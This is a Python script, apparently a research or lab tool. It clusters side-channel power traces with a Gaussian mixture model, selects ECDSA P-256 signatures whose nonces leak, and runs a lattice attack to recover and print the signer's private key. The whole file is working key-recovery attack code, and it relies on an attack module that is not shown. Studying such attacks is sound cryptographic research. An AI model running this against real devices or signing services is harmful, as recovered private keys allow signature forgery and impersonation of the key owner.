#!/usr/bin/env python3

import argparse
import os

from sklearn import mixture
from ec import *
from base64 import b64decode as b64d
from hashlib import sha256


def pubkey_to_point(pubkey_filename):
    '''convert the public key file of the signer into two integers (works for P-256)'''

    text = open(pubkey_filename, 'r').read().split('\n')
    pubkey = b64d(text[1] + text[2])[27:]
    xx, yy = int.from_bytes(pubkey[:32], 'big'), int.from_bytes(pubkey[32:], 'big')
    return xx, yy


def sig_to_integer(sig_filename):
    '''convert the raw signature to a couple of integers (r,s) (works for signatures with P-256)'''

    raw = open(sig_filename, 'rb').read()
    rlen = raw[3]
    r = int.from_bytes(raw[4:4 + rlen], 'big')
    s = int.from_bytes(raw[6 + rlen:], 'big')
    return r, s


def msg_to_integer(msg_filename):
    '''convert the signed file to an integer with SHA-256'''
    return int.from_bytes(sha256(open(msg_filename, 'rb').read()).digest(), 'big')


def load_signatures(working_directory, signumbers):
    '''import signatures as list of integers (m,r,s) where m is the message, and (r,s) the signature'''

    list_sig = []
    for i in signumbers:
        m = msg_to_integer(working_directory + f'message_{i}.txt')
        r, s = sig_to_integer(working_directory + f'signature_{i}.bin')
        list_sig.append((m,r,s))
    return list_sig


def load_traces(working_directory, nsig, bounds):
    traces = []
    for i in range(nsig):
        f = open(working_directory + f'trace_{i}.txt', 'r')
        tmp = [float(line) for line in f]
        f.close()
        if not bounds is None:
            traces.append(tmp[bounds[0]:bounds[1]])
        else:
            traces.append(tmp)
    return traces


def analysis(pubkey_filename, working_directory, nsig, bounds, verb=False):
    if not working_directory.endswith('/'):
        working_directory += '/'

    # trace analysis
    # at the end, cluster1 should contain the list of indices
    # for the signatures to use in the lattice attack
    if verb: print(f'Loading {nsig} traces...')
    traces = load_traces(working_directory, nsig, bounds)

    if verb: print('Clustering of the traces...')
    gm = mixture.GaussianMixture(n_components=2)
    results = gm.fit_predict(traces)
    cluster0, cluster1 = [], []
    for pos in range(len(results)):
        if results[pos] == 0:
            cluster0.append(pos)
        else:
            cluster1.append(pos)
    
    if len(cluster0) < len(cluster1):
        cluster0, cluster1 = cluster1, cluster0

    if verb: print(f'Size of clusters: {len(cluster0)}, {len(cluster1)}')
    
    # now the lattice attack
    list_sig = load_signatures(working_directory, cluster1)
    pubkey = pubkey_to_point(pubkey_filename)

    guess = -1
    for n in range(min(37, len(list_sig)), len(list_sig) + 1):
        if verb: print(f'Lattice attack: recovering of the key with {n:2d} signatures...')
        guess = findkey(secp256r1, pubkey, list_sig[:n], False, 7)
        if guess != -1:
            break

    return guess


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='RPA analysis and lattice attack')

    parser.add_argument('--pubkey', action='store', dest='pubkey_filename', type=str,
                        help='/path/to/publickey', required=True)

    parser.add_argument('--working-dir', action='store', dest='working_directory', type=str,
                        help='/path/to/working-directory', required=True)

    parser.add_argument('-n', action='store', dest='nsig', type=int,
                        help='Number of signatures', required=True)

    parser.add_argument('--bounds', action='store', nargs = 2, dest='bounds', type=int,
                        required=False, default=None)
    
    args = parser.parse_args()    
    key = analysis(args.pubkey_filename, args.working_directory, args.nsig, args.bounds, verb=True)

    if key != - 1:
        print(f'SUCCESS!\nThe private key is {key:064x}')
    else:
        print('FAILED')

    
